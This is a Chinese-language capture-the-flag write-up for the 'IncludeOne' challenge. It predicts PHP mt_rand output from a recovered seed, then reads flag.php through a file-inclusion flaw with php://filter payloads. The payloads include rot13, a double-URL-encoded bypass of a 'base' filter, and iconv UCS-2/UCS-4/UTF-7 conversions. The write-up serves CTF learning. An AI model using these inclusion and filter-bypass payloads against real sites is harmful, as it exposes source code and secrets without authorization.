

![img](https://peekaboo.show/content/images/2022/11/31c229d21ffafacd58828cc154334559.jpg)



# Week2 IncludeOne 200



#### 0、使用到的知识点



>   php中mt_srand()、mt_rand() 方法设置随机数种子和生产随机数

>   php_mt_seed 工具爆破随机数种子

>   php://filter 伪协议读取文件

>   php://filter 伪协议rot13编码、url双层编码绕过读取文件

#### 1、页面代码

‌

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include("seed.php");
//mt_srand(*********);
echo "Hint: ".mt_rand()."<br>";
if(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){
    if(!preg_match("/base|\.\./i",$_GET['file']) && preg_match("/NewStar/i",$_GET['file']) && isset($_GET['file'])){
        //flag in `flag.php`
        include($_GET['file']);
    }else{
        echo "Baby Hacker?";
    }
}else{
    echo "No Hacker!";
} Hint: 1219893521
No Hacker!
```

php

-   
-   
-   

‌

#### 2、首先根据hint的提示爆破一下随机数种子

>   使用php_mt_seed工具，linux中进入php_mt_seed工具所在目录执行以下命令，获得种子为：1145146

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115221734.png)

-   
-   
-   

‌

#### 3、使用php的函数获得下一个随机数

>   mt_srand(1145146)：设置随机数种子‌
>   ‌mt_rand()：获得第一个随机数，需要的是第二个随机数

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115222641.png)

-   
-   
-   

‌

>   由上面的结果可以看出，第一个随机数就是题目所给提示的数字，然后第二个随机数就是我们所需要的数字

#### 4、分析一下代码

‌

```
<?php
highlight_file(__FILE__);
error_reporting(0);
include("seed.php");
//mt_srand(*********);

// 输出第一个随机数
echo "Hint: ".mt_rand()."<br>";

// post请求传入一个guess参数，不能为空并且md5加密要等于下一个随机数
if(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){

	// 参数值中不能有base，必须有NewStar
    if(!preg_match("/base|\.\./i",$_GET['file']) && preg_match("/NewStar/i",$_GET['file']) && isset($_GET['file'])){
    
        //flag in `flag.php`
        include($_GET['file']);
    }else{
        echo "Baby Hacker?";
    }
}else{
    echo "No Hacker!";
} Hint: 1219893521
No Hacker!
```

-   
-   
-   

‌

>   看到include可以联想到使用伪协议，然后需要的是读取文件，可以使用：filter协议读取，因为过滤base所以不能使用base64编码读取文件，可以使用rot13编码读取，

>   那么file的参数值为：file=php://filter/read=string.rot13/newstar/resource=flag.php‌
>   ‌因为必须包含NewStar，所以最终结果为：‌
>   ‌file=php://filter/NewStar/read=string.rot13/newstar/resource=flag.php

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/hfdhsdhh.png)

-   
-   
-   

‌

>   查看源代码可以发现一行以rot13编码的flag，将其解码就可有得到flag

#### 5、获得flag

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115230438.png)



‌

#### 6、强行使用base64读取文件

>   因为正则过滤了base这四个字母，但是filter协议自带一层url解码，所以双层url编码可以绕这里的过滤‌
>   ‌ 例如：s的url编码为%73，然后在单独对：%、7、3进行一次url编码得到%25%37%33，从而绕过正则过滤

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115231515.png)



‌

>   这样就得到了一串以base64加密的flag，然后网上使用base64解码一下

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221115231706.png)



‌

#### 7、iconv编码方式绕过

UCS-2：对目标字符串进行2位一反转‌
‌UCS-4：对目标字符串进行4位一反转

‌

```
file=php://filter/NewStar/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
```



‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116155851.png)

-   
-   
-   

‌

‌

```
php://filter/NewStar/read=convert.iconv.UCS-4LE.UCS-4BE/resource=flag.php
```





![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116161059.png)



‌

‌

```
file=php://filter/NewStar/read=convert.iconv.ASCII.UCS-2BE/resource=flag.php
```



‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116160008.png)



‌

‌

```
file=php://filter/NewStar/convert.iconv.utf-8.utf-7/resource=flag.php
```



‌

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116160056.png)



>   最后下班！



